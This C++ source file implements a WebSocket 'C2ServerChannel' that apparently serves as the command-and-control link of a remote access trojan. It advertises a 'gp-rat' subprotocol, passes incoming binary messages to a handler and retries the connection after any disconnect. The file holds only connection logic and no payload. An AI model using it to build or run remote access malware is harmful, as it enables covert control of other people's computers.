//
// Created by alsah on 05.04.23.
//

#include "C2ServerChannel.h"

#include <utility>



bool C2ServerChannel::open(const std::string& server, const std::string& path, bool recover) {

    run = true;
    url = "ws://" + server + path;

    if(!recover){
        return tryToOpen();
    }

    // blocking operation !!
    recoverConnection();

    return false;
}

void C2ServerChannel::close([[maybe_unused]] const std::string& reason) {

    run = false;

    if(!ws->isClosed()){
        ws->close();
    }
}


void C2ServerChannel::setupChannelCallbacks() {

    ws->onOpen([this]{
        this->opened = true;
        state = ChannelState::OPENED;
        wsPromise.set_value();

        config.onOpened();

        std::cout << "WebSocket connected to " << ws->remoteAddress().value_or("???") << ", signaling ready" << std::endl;
    });

    ws->onError([this](const std::string& error) {
        state = ChannelState::ERROR_CAUGHT;
        wsPromise.set_exception(std::make_exception_ptr(std::runtime_error(error)));
        std::cout << "WebSocket error: " << error << std::endl; // log it
    });

    ws->onClosed([this]() {

        state = ChannelState::CLOSED;
        // 2 close reasons: (failed to connect / due to disconnect or by remote host request )
        if(opened && run){
            // connection was opened; closed due to disconnect, have to recover
            // FIXME ????
            std::cout << "WebSocket closed" << std::endl;  // log it
            opened = false;
            config.onClosed();

            // TODO .... ???
            recoverConnection();
        } else if(!opened && run){
            std::cout << "failed to recover connection" << std::endl;  // log it
        }
    });

    ws->onMessage([this](auto data) {
        try{
            config.onMessage(std::get<rtc::binary>(data));
        } catch (std::bad_variant_access& error){ // log it
            std::cout << " received invalid message " + std::string(error.what());
        }
    });
}


bool C2ServerChannel::tryToOpen() {

    if(url.empty()){
        std::cout << "Error: connect url is empty" << std::endl;
        return false;
    }

    wsPromise = std::promise<void>();
    wsOpenResult = wsPromise.get_future();
    try {
        state = ChannelState::TRYING_TO_OPEN;

        ws->open(url);
        std::cout << "Waiting for signaling to be connected..." << std::endl;
        wsOpenResult.get();
        return true;
    } catch (...){
        std::cout << "Failed to connect, sleep and try again ..." << std::endl;
        return false;
    }
}

void C2ServerChannel::recoverConnection() {

    while(run){
        if(tryToOpen()){
            break;
        }
        state = ChannelState::WAITING_TO_RECOVER;
        std::this_thread::sleep_for(std::chrono::seconds (config.sleepToRecover));
    }
}

C2ServerChannel::C2ServerChannel(C2ServerChannelConfiguration config) : config(std::move(config)){

    wsConfig.protocols.emplace_back("sip");
    wsConfig.protocols.emplace_back("gp-rat");

    ws = std::make_shared<rtc::WebSocket>(wsConfig);
    setupChannelCallbacks();
    state = ChannelState::INITIALIZED;

    run = false;
    opened = false;
}


C2ServerChannelConfiguration::C2ServerChannelConfiguration(
        const std::function<void()> &onClosed,
        const std::function<void()> &onOpened,
        const std::function<void(std::vector<std::byte>)> &onMessage,
        size_t sleepToRecover)
        :
        onClosed(onClosed),
        onOpened(onOpened),
        onMessage(onMessage),
        sleepToRecover(sleepToRecover) {}